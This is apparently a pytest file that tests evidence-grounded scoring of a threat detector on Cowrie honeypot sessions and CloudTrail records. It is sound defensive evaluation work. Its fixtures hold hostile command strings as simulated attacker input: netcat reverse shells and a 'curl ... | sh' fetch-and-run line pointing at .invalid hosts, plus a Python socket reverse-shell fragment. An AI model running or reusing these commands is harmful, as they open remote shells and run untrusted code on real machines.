import json
from copy import deepcopy
from datetime import UTC, datetime, timedelta
from zipfile import ZipFile

import pytest

from app.services.public_detection import PublicDetectionService, public_rule_policies
from scripts import m6_public_evidence_scoring as scoring
from scripts.evaluate_m6 import canonical, digest
from scripts.evaluate_m6_public_independent import contains_reference_field

START = datetime(2026, 1, 1, tzinfo=UTC)


def observation(group="one", *, attack=True):
    return {
        "source": "cowrie", "original_group_id": group,
        "events": [
            {"id": group + "-login", "timestamp": START.isoformat(),
             "kind": "cowrie.login.success", "connection_id": group},
            {"id": group + "-command", "timestamp": (START + timedelta(seconds=1)).isoformat(),
             "kind": "cowrie.command.input", "connection_id": group,
             "command": "nc host.invalid 9999 -e /bin/sh" if attack else "whoami"},
            {"id": group + "-close", "timestamp": (START + timedelta(seconds=2)).isoformat(),
             "kind": "cowrie.session.closed", "connection_id": group},
        ],
    }


def truth_for(observed, *, group_label="threat", attack_ids=None, granularity="event"):
    attack_ids = {observed["original_group_id"] + "-command"} if attack_ids is None else attack_ids
    return {
        event["id"]: {
            "source": observed["source"], "original_group_id": observed["original_group_id"],
            "event_label": None if granularity == "group"
            else ("threat" if event["id"] in attack_ids else "normal"),
            "label_granularity": granularity, "group_label": group_label,
            "observed_event_sha256": scoring.observation_event_hash(event),
        }
        for event in observed["events"]
    }


def evaluate(observed):
    return PublicDetectionService().evaluate(observed)


def score(observations, truth, *, decisions=None):
    references = [{
        "source": item["source"], "original_group_id": item["original_group_id"],
        "expected_label": truth[item["events"][0]["id"]]["group_label"],
    } for item in observations]
    return scoring.score_predictions(
        observations, references,
        decisions or {item["original_group_id"]: evaluate(item) for item in observations}, truth,
    )


def test_matching_group_label_cannot_launder_unrelated_attack_event():
    observed = observation()
    truth = truth_for(observed, attack_ids={"one-login"})
    result = score([observed], truth)
    assert result["group_summary"]["conditional_confusion"]["tp"] == 1
    assert result["grounded_metrics"]["supported_true_positives"] == 0
    assert result["grounded_metrics"]["precision"] == 0
    assert result["grounded_metrics"]["recall"] == 0
    assert result["grounded_metrics"]["unsubstantiated_positive_claims"] == 1
    assert result["evidence_summary"]["group_true_positives_without_supported_evidence"] == 1
    assert result["rows"][0]["evidence_status"] == "unsupported"
    assert result["acceptance"]["passed"] is False


def test_supported_and_unsupported_claims_both_remain_precision_denominator():
    supported, unsupported, held = observation("supported"), observation("unsupported"), observation("held", attack=False)
    truth = scoring.merge_event_truth(
        truth_for(supported), truth_for(unsupported, attack_ids={"unsupported-login"}),
        truth_for(held, attack_ids={"held-login"}),
    )
    result = score([supported, unsupported, held], truth)
    metrics = result["grounded_metrics"]
    assert metrics["supported_true_positives"] == 1
    assert metrics["threat_claims"] == 2
    assert metrics["precision"] == .5
    assert metrics["recall"] == pytest.approx(1 / 3)
    assert metrics["f1"] == .4
    assert metrics["missed_threats"] == 2
    assert metrics["unsubstantiated_positive_claims"] == 1


def test_supported_threat_and_normal_control_can_meet_observed_cohort_gates():
    attack, normal = observation(), observation("normal", attack=False)
    truth = scoring.merge_event_truth(truth_for(attack), truth_for(normal, group_label="normal", attack_ids=set()))
    result = score([attack, normal], truth)
    assert result["acceptance"]["passed"] is True
    assert result["acceptance"]["independent_generalization_verified"] is False
    assert result["grounded_metrics"]["precision"] == 1
    assert result["grounded_metrics"]["false_positive_rate"] == 0


def test_group_only_truth_is_unverifiable_not_event_level_truth():
    observed = observation()
    result = score([observed], truth_for(observed, granularity="group"))
    assert result["rows"][0]["evidence_status"] == "unverifiable"
    assert result["grounded_metrics"]["supported_true_positives"] == 0
    assert result["acceptance"]["gates"]["evidence_support"] is False


def test_zero_threat_predictions_never_vacuously_pass_evidence_gate():
    observed = observation(attack=False)
    result = score([observed], truth_for(observed, group_label="normal", attack_ids=set()))
    assert result["grounded_metrics"]["precision"] is None
    assert result["grounded_metrics"]["recall"] is None
    assert result["acceptance"]["gates"]["evidence_support"] is False
    assert result["acceptance"]["passed"] is False


def test_candidate_attack_evidence_does_not_count_as_threat_detection():
    observed = observation()
    observed["events"][1]["command"] = "curl https://host.invalid/tool | sh"
    prediction = evaluate(observed)
    assert prediction["verdict"] == "unknown"
    result = score([observed], truth_for(observed))
    assert result["grounded_metrics"]["supported_true_positives"] == 0
    assert result["evidence_summary"]["investigation_groups"] == 1
    assert result["evidence_summary"]["candidate_evidence_labels"]["threat"] == 1
    assert result["acceptance"]["passed"] is False


@pytest.mark.parametrize("change", ["rule", "feature", "disposition", "cherry_pick", "duplicate", "no_findings", "aggregate"])
def test_changed_rule_or_selected_evidence_cannot_qualify(change):
    observed = observation()
    truth = truth_for(observed, attack_ids={"one-login", "one-command"})
    prediction = deepcopy(evaluate(observed))
    if change == "rule":
        prediction["findings"][0]["rule_id"] = "unknown-rule"
    elif change == "feature":
        prediction["findings"][0]["feature"] = "cloud_object_burst"
    elif change == "disposition":
        prediction["findings"][0]["disposition"] = "investigate"
    elif change == "cherry_pick":
        prediction["findings"][0]["evidence_ids"] = ["one-login"]
        prediction["evidence_ids"] = ["one-login"]
    elif change == "duplicate":
        prediction["findings"][0]["evidence_ids"] *= 2
    elif change == "no_findings":
        prediction.pop("findings")
    else:
        prediction["evidence_ids"] = []
    result = scoring.qualify_prediction(observed, prediction, truth)
    assert result["supported_threat_claim"] is False
    assert result["evidence_status"] == "invalid"
    assert result["errors"]


@pytest.mark.parametrize("change", ["missing", "other_group", "other_source", "event_only"])
def test_evidence_must_resolve_to_same_source_and_group(change):
    observed = observation()
    truth = truth_for(observed)
    if change == "missing":
        truth.pop("one-command")
    elif change == "other_group":
        truth["one-command"]["original_group_id"] = "another"
    elif change == "other_source":
        truth["one-command"]["source"] = "cloudtrail"
    else:
        truth["one-command"]["original_group_id"] = None
    result = scoring.qualify_prediction(observed, evaluate(observed), truth)
    assert result["evidence_status"] == "invalid"
    assert result["supported_threat_claim"] is False


def test_each_threat_finding_needs_its_own_attack_support(monkeypatch):
    observed = observation()
    truth = truth_for(observed)
    expected = evaluate(observed)
    policy = public_rule_policies()
    expected["findings"].append({"rule_id": "second-test-rule", "feature": "test-feature",
                                  "disposition": "threat", "evidence_ids": ["one-login"]})
    expected["evidence_ids"].append("one-login")
    policy["second-test-rule"] = {"feature": "test-feature", "disposition": "threat"}
    monkeypatch.setattr(PublicDetectionService, "evaluate", lambda self, data: deepcopy(expected))
    result = scoring.qualify_prediction(observed, expected, truth, rule_policies=policy)
    assert [row["alignment"] for row in result["findings"]] == [
        "publisher_attack_evidence_present", "publisher_attack_evidence_absent",
    ]
    assert result["evidence_status"] == "unsupported"


def test_mixed_event_labels_are_reported_without_hiding_normal_evidence():
    observed = observation()
    observed["events"][2].update(kind="cowrie.command.input", command="nc peer.invalid 9999 -e /bin/sh")
    result = scoring.qualify_prediction(observed, evaluate(observed), truth_for(observed))
    assert result["supported_threat_claim"] is True
    assert result["threat_evidence_labels"] == {"threat": 1, "normal": 1}


def test_recomputed_detector_receives_no_reference_labels(monkeypatch):
    observed = observation()
    original = PublicDetectionService.evaluate
    calls = []

    def spy(self, data):
        assert not contains_reference_field(data)
        assert set(data) == {"source", "original_group_id", "events"}
        calls.append(deepcopy(data))
        return original(self, data)

    prediction = original(PublicDetectionService(), observed)
    monkeypatch.setattr(PublicDetectionService, "evaluate", spy)
    scoring.qualify_prediction(observed, prediction, truth_for(observed))
    assert calls == [observed]


def raw_event(*, attack=False):
    result = {
        "eventID": "native-event", "eventTime": "2026-01-01T00:00:00Z",
        "eventSource": "s3.amazonaws.com", "eventName": "GetObject",
        "userIdentity": {"accountId": "account", "accessKeyId": "ASIA-temp", "principalId": "actor"},
        "should_sample": attack,
    }
    if attack:
        result["attack_name"] = "FixtureAttack"
    return result


def test_pinned_cloudtrail_archive_loader_and_annotation_conflicts(tmp_path):
    path = tmp_path / "records.zip"
    with ZipFile(path, "w") as archive:
        archive.writestr("records.json", json.dumps({"Records": [raw_event(attack=True)]}))
    index, metadata = scoring.load_cloudtrail_event_truth(path, expected_sha256=digest(path.read_bytes()))
    assert len(index) == 1
    reference = next(iter(index.values()))
    assert reference["event_label"] == "threat"
    assert reference["group_label"] == "threat"
    assert metadata["label_granularity"] == "event"
    with pytest.raises(ValueError, match="archive_hash"):
        scoring.load_cloudtrail_event_truth(path, expected_sha256="0" * 64)
    with pytest.raises(ValueError, match="conflicting_duplicate_label"):
        scoring.cloudtrail_event_truth([raw_event(), raw_event(attack=True)])


def test_event_only_raw_record_is_not_assigned_to_a_session():
    raw = raw_event(attack=True)
    raw.pop("userIdentity")
    index, _ = scoring.cloudtrail_event_truth([raw])
    assert next(iter(index.values()))["original_group_id"] is None
    assert next(iter(index.values()))["group_label"] is None


def test_cowrie_loader_never_copies_group_labels_onto_events(monkeypatch, tmp_path):
    raw = {"timestamp": START.isoformat(), "eventid": "cowrie.command.input",
           "session": "session", "input": "whoami"}
    identifier = digest(canonical(raw))
    path = tmp_path / "fixture.zip"
    with ZipFile(path, "w") as archive:
        for round_number in range(1, 25):
            archive.writestr(scoring.cowrie.PREFIX + f"r{round_number:02}_cowrie.json",
                             json.dumps(raw) if round_number == 1 else "")
    monkeypatch.setattr(scoring.cowrie, "load_cowrie", lambda path: ([{
        "original_group_id": "actor-round", "event_hashes": [identifier], "expected_label": "threat",
    }], {"archive_sha256": "pinned"}))
    index, metadata = scoring.load_cowrie_event_truth(path)
    assert metadata["label_granularity"] == "group"
    assert all(row["group_label"] == "threat" and row["event_label"] is None for row in index.values())
    assert index[identifier]["observed_event_sha256"] == scoring.observation_event_hash(scoring.cowrie_event(raw))


@pytest.mark.parametrize("field,value", [
    ("command", "python3 -c 'import socket,os; s=socket.socket(); os.dup2(s.fileno(),0)'"),
    ("timestamp", "2027-01-01T00:00:00Z"), ("outcome", "success"),
    ("resource_hashes", ["fabricated-resource"]), ("connection_id", "other-connection"),
])
def test_retained_raw_identifier_cannot_hide_tampered_normalized_payload(field, value):
    original = observation()
    truth = truth_for(original)
    changed = deepcopy(original)
    changed["events"][1][field] = value
    prediction = evaluate(changed)
    result = scoring.qualify_prediction(changed, prediction, truth)
    assert result["contract_valid"] is False
    assert "source_event_projection_mismatch" in result["errors"]
    with pytest.raises(ValueError, match="source_reference_join"):
        score([changed], truth)


def test_missing_source_projection_digest_is_not_accepted():
    observed = observation()
    truth = truth_for(observed)
    truth["one-command"].pop("observed_event_sha256")
    result = scoring.qualify_prediction(observed, evaluate(observed), truth)
    assert result["supported_threat_claim"] is False
    assert "source_event_projection_mismatch" in result["errors"]


def test_reference_merge_rejects_conflicting_event_assignment():
    observed = observation()
    first = truth_for(observed)
    second = deepcopy(first)
    second["one-command"]["original_group_id"] = "different-group"
    with pytest.raises(ValueError, match="conflicting_reference"):
        scoring.merge_event_truth(first, second)
